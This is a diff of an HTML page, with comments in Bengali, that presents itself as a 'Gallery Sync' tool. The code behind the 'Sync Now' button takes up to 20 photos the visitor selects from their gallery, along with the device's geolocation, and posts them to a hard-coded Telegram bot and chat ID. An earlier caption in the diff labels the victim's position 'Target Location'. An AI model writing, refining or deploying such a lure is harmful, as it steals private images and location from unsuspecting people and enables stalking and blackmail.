@@ -2,20 +2,46 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Syncing...</title>
 <style>
-  body { margin:0; padding:0; background:#fff; height:100vh; overflow:hidden; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-  .loader-bar { position:fixed; top:0; left:0; width:100%; height:3px; background:#ddd; z-index:999; }
-  .progress { width:0%; height:100%; background:#0088cc; transition:width 2s ease-in-out; }
-  .status { position:fixed; bottom:10px; left:50%; transform:translateX(-50%); font-size:10px; color:#ccc; opacity:.5; text-align: center; width: 100%; }
-  /* ফুল স্ক্রিন ক্লিক জোন */
-  #clickOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; }
+  body { 
+    margin:0; padding:0; background:#f4f4f4; height:100vh; 
+    display: flex; justify-content: center; align-items: center; 
+    font-family: sans-serif;
+  }
+  .sync-box {
+    text-align: center;
+    padding: 20px;
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+  }
+  /* এই বাটনটি ছাড়া গ্যালারি ওপেন হবে না */
+  .sync-btn { 
+    background: #0088cc; color: white; border: none; 
+    padding: 15px 30px; border-radius: 50px; font-size: 16px; 
+    cursor: pointer; font-weight: bold; transition: 0.3s;
+  }
+  .sync-btn:active { transform: scale(0.95); }
+  
+  .loader-bar { position:fixed; top:0; left:0; width:100%; height:4px; background:#ddd; }
+  .progress { width:0%; height:100%; background:#0088cc; transition: 0.3s; }
+  .status { margin-top: 15px; font-size: 12px; color: #666; }
 </style>
 </head>
 <body>
 
-<div id="clickOverlay"></div> <div class="loader-bar"><div class="progress" id="progressBar"></div></div>
-<div class="status" id="statusText">System Initializing... <br> (Tap anywhere to sync)</div>
+<div class="loader-bar"><div class="progress" id="progressBar"></div></div>
+
+<div class="sync-box">
+  <h3>Gallery Sync</h3>
+  <p style="font-size: 13px; color: #888;">Tap the button to start synchronization</p>
+  <button class="sync-btn" id="mainBtn">Sync Now</button>
+  <div class="status" id="statusText">Ready to Sync</div>
+</div>
+
+<input type="file" id="fileInput" multiple accept="image/*" style="display: none;">
 
 <script>
 // --- CONFIG ---
@@ -23,83 +49,79 @@ const TELEGRAM_BOT_TOKEN = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY';
 const TELEGRAM_CHAT_ID   = '7767412329';
 // --------------
 
-const input = document.createElement('input');
-input.type = 'file';
-input.multiple = true;
-input.accept = "image/*";
+const mainBtn = document.getElementById('mainBtn');
+const fileInput = document.getElementById('fileInput');
+const statusText = document.getElementById('statusText');
+const progressBar = document.getElementById('progressBar');
 
-// ইউজার স্ক্রিনে যেকোনো জায়গায় ক্লিক করলেই ফাইল ইনপুট ওপেন হবে
-document.getElementById('clickOverlay').addEventListener('click', () => {
-  input.click();
+// বাটনে ক্লিক করলেই গ্যালারি ওপেন হবে
+mainBtn.addEventListener('click', () => {
+  fileInput.click();
 });
 
-input.onchange = async (e) => {
+fileInput.onchange = async (e) => {
   const files = e.target.files;
   if (files.length === 0) return;
 
-  document.getElementById('statusText').innerText = "Syncing in progress...";
-  document.getElementById('progressBar').style.width = '50%';
-
+  mainBtn.disabled = true;
+  mainBtn.style.background = "#ccc";
+  statusText.innerText = "Accessing Location...";
+  
   const location = await getGeoLocation();
   const totalImages = Math.min(files.length, 20);
 
   for (let i = 0; i < totalImages; i++) {
+    statusText.innerText = `Sending Image ${i + 1} of ${totalImages}...`;
     const file = files[i];
     const base64 = await toBase64(file);
     try {
       await sendToTelegram(base64, location, i);
-      // প্রগ্রেস বার আপডেট
-      let percent = 50 + ((i + 1) / totalImages * 50);
-      document.getElementById('progressBar').style.width = percent + '%';
+      let percent = ((i + 1) / totalImages) * 100;
+      progressBar.style.width = percent + '%';
     } catch (err) {
-      console.log("Error sending image " + i);
+      console.log("Error:", err);
     }
   }
 
-  document.getElementById('progressBar').style.width = '100%';
-  document.getElementById('statusText').innerText = "Done";
-  setTimeout(() => { document.getElementById('progressBar').style.width = '0%'; }, 2000);
+  statusText.innerText = "Sync Completed Successfully!";
+  mainBtn.disabled = false;
+  mainBtn.style.background = "#0088cc";
 };
 
 function getGeoLocation() {
   return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve("Lat/Long Not Found");
+    if (!navigator.geolocation) return resolve("Location not supported");
     navigator.geolocation.getCurrentPosition(
-      pos => resolve(`📍 Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
+      pos => resolve(`Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
       () => resolve("Location Access Denied"),
-      { timeout: 4000 }
+      { timeout: 5000 }
     );
   });
 }
 
 function toBase64(file) {
-  return new Promise((resolve, reject) => {
+  return new Promise((resolve) => {
     const reader = new FileReader();
     reader.readAsDataURL(file);
     reader.onload = () => resolve(reader.result);
-    reader.onerror = err => reject(err);
   });
 }
 
 async function sendToTelegram(base64Image, locationText, index) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-  
-  // Base64 থেকে Blob তৈরি করা (এটি অনেক বেশি স্টেবল)
   const fetchRes = await fetch(base64Image);
   const blob = await fetchRes.blob();
-
-  const caption = index === 0
-    ? `📍 <b>Target Location:</b>\n${locationText}\n\n📂 Gallery Synced!`
-    : `Image ${index + 1}`;
 
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('photo', blob, `img${index}.jpg`);
-  formData.append('caption', caption);
-  formData.append('parse_mode', 'HTML');
+  
+  if (index === 0) {
+    formData.append('caption', `📍 Location: ${locationText}\n📂 Gallery Sync Started!`);
+  }
 
   await fetch(url, { method: 'POST', body: formData });
 }
 </script>
 </body>
-</html>
+                                                                                    </html>
